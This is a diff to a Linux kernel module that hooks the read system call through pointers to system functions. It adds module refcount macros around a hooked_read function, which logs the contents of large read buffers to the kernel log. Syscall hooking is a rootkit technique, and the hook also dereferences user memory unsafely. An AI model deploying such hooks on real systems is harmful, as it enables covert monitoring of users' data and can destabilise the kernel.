@@ -7,8 +7,14 @@
 
 #include "sysmap.h"          /* Pointers to system functions */
 
-// the following line gets updated by script 
-
+// #define USE_MODULE_GET_PUT
+#ifdef USE_MODULE_GET_PUT
+#define OUR_TRY_MODULE_GET if (!try_module_get(THIS_MODULE)){return -1;}
+#define OUR_MODULE_PUT module_put(THIS_MODULE)
+#else
+#define OUR_TRY_MODULE_GET 
+#define OUR_MODULE_PUT 
+#endif
 
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
@@ -34,10 +40,12 @@ void make_page_readonly(long unsigned int _addr){
 
 asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     ssize_t retval;
+    OUR_TRY_MODULE_GET;
     if (*buf && count > 1024){
         printk(KERN_INFO "hooked_read(%d, %s, %d)", fd, buf, count);
     }
     retval = original_read(fd, buf, count);
+    OUR_MODULE_PUT;
     return retval;
 }
 
